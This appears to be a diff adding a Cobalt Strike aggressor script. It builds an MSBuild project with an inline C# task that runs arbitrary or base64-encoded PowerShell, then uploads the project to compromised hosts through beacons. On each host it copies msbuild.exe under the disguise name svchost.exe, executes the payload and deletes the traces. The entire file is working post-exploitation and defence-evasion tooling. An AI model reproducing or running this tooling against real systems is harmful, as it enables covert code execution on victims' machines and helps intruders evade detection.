@@ -1,0 +1,243 @@
+##############################################################################################################################################################
+######################################################### Global Variables ###################################################################################
+##############################################################################################################################################################
+
+# Global Variables
+%globalsettings['XMLHead'] = '<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe pshell.xml -->
+  <PropertyGroup>';
+%globalsettings['XMLBody'] = '</PropertyGroup>
+  <Target Name="Hello">
+   <ClassExample />
+  </Target>
+	<UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	<Task>
+	  <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+			using System;
+			using System.IO;
+			using System.Diagnostics;
+			using System.Reflection;
+			using System.Runtime.InteropServices;
+			using System.Collections.ObjectModel;
+			using System.Management.Automation;
+			using System.Management.Automation.Runspaces;
+			using System.Text;
+			using Microsoft.Build.Framework;
+			using Microsoft.Build.Utilities;
+			public class ClassExample :  Task, ITask
+			{
+				public string funcName = "$(FunctionName)";
+				public string Cmd = "$(Cmd)";
+				public string outFile = "$(OutFilePath)";
+				public override bool Execute()
+				{';
+%globalsettings['PostPoSh'] = 'string x = "";
+
+					if (funcName != "None")
+					{
+						byte[] data = Convert.FromBase64String(encScript);
+						string command = Encoding.ASCII.GetString(data);
+						x = command + "\n" + funcName;
+					}
+					else if (Cmd != "None")
+					{
+						x = Cmd;
+					}
+					if (outFile != "None")
+					{
+						x += " | Out-File -Encoding ascii -FilePath " + outFile;
+					}
+
+					try
+					{
+						Console.Write(RunPSCommand(x));
+					}
+					catch (Exception e)
+					{
+						Console.Write(e.Message);
+					}
+								return true;
+				}
+				public static string RunPSCommand(string cmd)
+				{
+					
+					Runspace runspace = RunspaceFactory.CreateRunspace();
+					runspace.Open();
+					RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
+					Pipeline pipeline = runspace.CreatePipeline();
+
+					pipeline.Commands.AddScript(cmd);
+					
+					pipeline.Commands.Add("Out-String");
+					Collection<PSObject> results = pipeline.Invoke();
+					runspace.Close();
+
+					StringBuilder stringBuilder = new StringBuilder();
+					foreach (PSObject obj in results)
+					{
+						stringBuilder.Append(obj);
+					}
+					return stringBuilder.ToString().Trim();
+				 }
+				 
+				 public static void RunPSFile(string script)
+				{
+					PowerShell ps = PowerShell.Create();
+					ps.AddScript(script).Invoke();
+				}
+			}	
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>';
+
+
+
+##############################################################################################################################################################
+################################################# PowerShell Command via MSBuild ###############################################################################
+##############################################################################################################################################################
+
+sub posh_cmd {
+    # Get all process IDs of selected beacons
+    @total_proc_ids = @();
+    foreach $beacon (beacons()) {
+        add(@total_proc_ids, $beacon['pid']);
+    }
+
+    $posh_box = dialog("PowerShell via MSBuild", %(Command => "Get-Process", OutPath => "C:\\\\Users\\\\Public\\\\Documents\\\\test.txt", Target => @total_proc_ids), &cmd_pwn);
+    dialog_description($posh_box, "Run a PowerShell command via MSBuild");
+
+    drow_text($posh_box, "Command", "PowerShell Command:");
+    drow_text($posh_box, "OutPath", "(Optional) Output Location:");
+    drow_combobox($posh_box, "Target", "Targeted System (PID):", @total_proc_ids);
+    dbutton_action($posh_box, "Launch");
+
+    dialog_show($posh_box);
+    clear(@total_proc_ids);
+}
+
+sub cmd_pwn {
+
+	# Build Command section of msbuild xml file
+    $cmd_set = "\n      <FunctionName Condition=\"\'\$(FunctionName)\' == \'\'\">None</FunctionName>\n<Cmd Condition=\"\'\$(Cmd)\' == \'\'\">". $3['Command'] ."</Cmd>\n";
+    if ($3['OutPath'] ne "") {
+      $cmd_set = $cmd_set."<OutFilePath Condition=\"\'\$(OutFilePath)\' == \'\'\">". $3['OutPath'] ."</OutFilePath>\n";
+    }
+    else {
+      $cmd_set = $cmd_set."<OutFilePath Condition=\"\'\$(OutFilePath)\' == \'\'\">None</OutFilePath>\n";
+    }
+
+    # Build out XML File for MSBuild
+    $xml_file = %globalsettings['XMLHead'];
+    $xml_file = $xml_file.$cmd_set.%globalsettings['XMLBody'];
+    $xml_file = $xml_file."\n\t\t\t\t\tstring encScript = \"\";\n\t\t\t\t\t";
+    $xml_file = $xml_file.%globalsettings['PostPoSh'];
+
+    # Write File to Disk Locally, upload it to system
+    $msbuild_handle = openf(">/tmp/msbuildme.xml");
+    println($msbuild_handle, $xml_file);
+    closef($handle);
+
+    # Find the proper beacon ID to use
+    # Upload xml file, copy msbuild and rename, trigger xml via msbuild, remove file and renamed msbuild
+    foreach $beacon (beacons()) {
+        if ($3['Target'] eq $beacon['pid']) {
+        	$read_handle = openf("/tmp/msbuildme.xml");
+        	$data_here = readb($read_handle, -1);
+        	closef($read_handle);
+        	bupload_raw($beacon['id'], "C:\\Users\\Public\\Documents\\trusteddata.xml", $data_here);
+        	bpowerpick($beacon['id'], "copy-item C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\msbuild.exe C:\\Users\\Public\\Documents\\svchost.exe");
+        	bpowerpick($beacon['id'], "C:\\Users\\Public\\Documents\\svchost.exe C:\\Users\\Public\\Documents\\trusteddata.xml");
+        	bpowerpick($beacon['id'], "rm C:\\Users\\Public\\Documents\\trusteddata.xml");
+        	bpowerpick($beacon['id'], "rm C:\\Users\\Public\\Documents\\svchost.exe");
+        	exec("rm /tmp/msbuildme.xml");
+        }
+    }
+}
+
+
+##############################################################################################################################################################
+########################################################### Command Line Section ##############################################################################
+##############################################################################################################################################################
+
+beacon_command_register("msbuild_script",
+    "Read in local PowerShell script, store in xml file, upload to target system and execute.",
+    "Synopsis: msbuild_script C:\\path\\to\\orig.ps1 Invoke-CustomFunction\n\n" .
+    "Description: The local PowerShell script is read, base64 encoded, and stored in an XML file.\n" .
+    "The XML file is uploaded to the system and then executed with MSBuild.");
+
+beacon_command_register("msbuild_cmd",
+    "Stores PowerShell commandin xml file, upload to target system and execute.",
+    "Synopsis: msbuild_cmd Invoke-PowerShellFunction\n\n" .
+    "Description: Stores PowerShell command in an XML file.\n" .
+    "The XML file is uploaded to the system and then executed with MSBuild.");
+
+alias msbuild_script {
+    $powershell_script = $2;
+    $powershell_function = $3;
+
+    # Build XML file
+    # Build Function section of msbuild xml file
+    $cmd_set = "\n      <FunctionName Condition=\"\'\$(FunctionName)\' == \'\'\">". $powershell_function ."</FunctionName>\n<Cmd Condition=\"\'\$(Cmd)\' == \'\'\">None</Cmd>\n";
+    $cmd_set = $cmd_set."<OutFilePath Condition=\"\'\$(OutFilePath)\' == \'\'\">None</OutFilePath>\n";
+
+    $ps1_handle = openf($powershell_script);
+    $ps1_data = readb($ps1_handle, -1);
+    closef($ps1_handle);
+    $encoded_ps1 = base64_encode($ps1_data);
+
+    # Build out XML File for MSBuild
+    $xml_file = %globalsettings['XMLHead'];
+    $xml_file = $xml_file.$cmd_set.%globalsettings['XMLBody'];
+    $xml_file = $xml_file."\n\t\t\t\t\tstring encScript = \"". $encoded_ps1 ."\";\n\t\t\t\t\t";
+    $xml_file = $xml_file.%globalsettings['PostPoSh'];
+
+    # Write File to Disk Locally, upload it to system
+    $msbuild_handle = openf(">/tmp/msbuildme.xml");
+    println($msbuild_handle, $xml_file);
+    closef($handle);
+
+    # Find the proper beacon ID to use
+    # Upload xml file, copy msbuild and rename, trigger xml via msbuild, remove file and renamed msbuild
+    $read_handle = openf("/tmp/msbuildme.xml");
+    $data_here = readb($read_handle, -1);
+    closef($read_handle);
+    bupload_raw($1, "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\trusteddata.xml", $data_here);
+    bpowerpick($1, "C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\msbuild.exe C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\trusteddata.xml");
+    bpowerpick($1, "rm C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\trusteddata.xml");
+    exec("rm /tmp/msbuildme.xml");
+}
+
+alias msbuild_cmd {
+    $powershell_command = $2;
+
+    $cmd_set = "\n      <FunctionName Condition=\"\'\$(FunctionName)\' == \'\'\">None</FunctionName>\n<Cmd Condition=\"\'\$(Cmd)\' == \'\'\">". $powershell_command ."</Cmd>\n";
+    $cmd_set = $cmd_set."<OutFilePath Condition=\"\'\$(OutFilePath)\' == \'\'\">None</OutFilePath>\n";
+
+    # Build out XML File for MSBuild
+    $xml_file = %globalsettings['XMLHead'];
+    $xml_file = $xml_file.$cmd_set.%globalsettings['XMLBody'];
+    $xml_file = $xml_file."\n\t\t\t\t\tstring encScript = \"\";\n\t\t\t\t\t";
+    $xml_file = $xml_file.%globalsettings['PostPoSh'];
+
+    # Write File to Disk Locally, upload it to system
+    $msbuild_handle = openf(">/tmp/msbuildme.xml");
+    println($msbuild_handle, $xml_file);
+    closef($handle);
+
+    # Find the proper beacon ID to use
+    # Upload xml file, copy msbuild and rename, trigger xml via msbuild, remove file and renamed msbuild
+    $read_handle = openf("/tmp/msbuildme.xml");
+    $data_here = readb($read_handle, -1);
+    closef($read_handle);
+    bupload_raw($1, "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\trusteddata.xml", $data_here);
+    bpowerpick($1, "C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\msbuild.exe C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\trusteddata.xml");
+    bpowerpick($1, "rm C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\trusteddata.xml");
+    exec("rm /tmp/msbuildme.xml");
+}
